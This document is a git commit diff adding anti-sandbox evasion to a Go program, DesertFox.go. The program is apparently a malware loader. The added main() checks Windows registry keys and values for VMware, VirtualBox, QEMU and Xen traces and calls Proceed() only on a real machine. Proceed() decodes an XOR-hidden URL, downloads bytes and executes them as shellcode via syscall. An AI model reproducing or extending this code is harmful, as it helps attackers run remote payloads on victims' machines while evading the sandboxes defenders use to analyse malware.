2d5be96ecf7d4a5538feaa6e92dbe0f66668b6ef
MarshalRommel <zha0gongz1@protonmail.com>
2021-05-11 17:51:30 +0800

    Update DesertFox.go
    Add anti sandbox function

--- DesertFox.go
+++ DesertFox.go
@@ -1,11 +1,15 @@
 package main
 
 import (
+	"fmt"
+	"golang.org/x/sys/windows/registry"
 	"io/ioutil"
 	"log"
 	"net/http"
 	"os"
+	"path/filepath"
 	"strconv"
+	"strings"
 	"syscall"
 	"unsafe"
 )
@@ -50,7 +54,6 @@ func dec(src string) (res string) {
 	var result string
 	j := 0
 	bt := []rune(src)
-	//fmt.Println(bt)
 	for i := 0; i < len(src)/2; i++ {
 		s, _ = strconv.ParseInt(string(bt[i*2:i*2+2]), 16, 0)
 		result = result + string(byte(s)^XorKey[j])
@@ -59,7 +62,7 @@ func dec(src string) (res string) {
 	return result
 }
 
-func main() {
+func Proceed() {
 	//下方填上异或加密(encryptUrl.go)后的url
 	Url := dec("Ciphertext")
 	var charcode []byte
@@ -88,4 +91,66 @@ func main() {
 	}
 
 	syscall.Syscall(addr, 0, 0, 0, 0)
+}
+
+func main() {
+
+	EvidenceOfSandbox := make([]string, 0)
+
+	sandboxStrings := [...]string{`vmware`, `virtualbox`, `vbox`, `qemu`, `xen`}
+
+	HKLM_Keys_To_Check_Exist := [...]string{
+		`HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier`,
+		`HARDWARE\DEVICEMAP\Scsi\Scsi Port 2\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier`,
+		`HARDWARE\DEVICEMAP\Scsi\Scsi Port 3\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier`,
+		`SYSTEM\CurrentControlSet\Enum\SCSI\Disk&Ven_VMware_&Prod_VMware_Virtual_S`,
+		`SYSTEM\CurrentControlSet\Control\CriticalDeviceDatabase\root#vmwvmcihostdev`,
+		`SYSTEM\CurrentControlSet\Control\VirtualDeviceDrivers`,
+		`SOFTWARE\VMWare, Inc.\VMWare Tools`,
+		`SOFTWARE\Oracle\VirtualBox Guest Additions`,
+		`SYSTEM\ControlSet001\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000\DriverDesc`,
+		`HARDWARE\ACPI\DSDT\VBOX_`}
+
+	HKLM_Keys_With_Values_To_Parse := [...]string{
+		`SYSTEM\ControlSet001\Services\Disk\Enum\0`,
+		`HARDWARE\Description\System\SystemBiosInformation`,
+		`HARDWARE\Description\System\VideoBiosVersion`,
+		`HARDWARE\Description\System\BIOS\SystemManufacturer`,
+		`HARDWARE\Description\System\BIOS\SystemProductName`,
+		`HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0`,
+		`SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\DEBC90B799113AB499842AD87B9C3C69\InstallProperties\DisplayName`,
+		`SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\DEBC90B799113AB499842AD87B9C3C69\InstallProperties\Publisher`,
+		`HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Installer\Products\DEBC90B799113AB499842AD87B9C3C69\ProductName`}
+
+	for _, HKLM_Key := range HKLM_Keys_To_Check_Exist {
+		Opened_Key, err := registry.OpenKey(registry.LOCAL_MACHINE, HKLM_Key, registry.QUERY_VALUE)
+		defer Opened_Key.Close()
+
+		if (err == nil) {
+			EvidenceOfSandbox = append(EvidenceOfSandbox, `HKLM:\` + HKLM_Key)
+		}
+	}
+
+	for _, HKLM_Key := range HKLM_Keys_With_Values_To_Parse {
+		Opened_Key, err := registry.OpenKey(registry.LOCAL_MACHINE, filepath.Dir(HKLM_Key), registry.QUERY_VALUE)
+		defer Opened_Key.Close()
+
+		if (err == nil) {
+			regValue, _, err := Opened_Key.GetStringValue(filepath.Base(HKLM_Key))
+			if (err == nil) {
+				for _, sandboxString := range sandboxStrings {
+					if strings.Contains(strings.ToLower(regValue), strings.ToLower(sandboxString)) {
+						EvidenceOfSandbox = append(EvidenceOfSandbox, HKLM_Key + " => " + regValue)
+					}
+				}
+			}
+		}
+	}
+
+	if len(EvidenceOfSandbox) == 0 {
+		Proceed()
+	} else {
+		fmt.Println(EvidenceOfSandbox)
+	}
+
 }
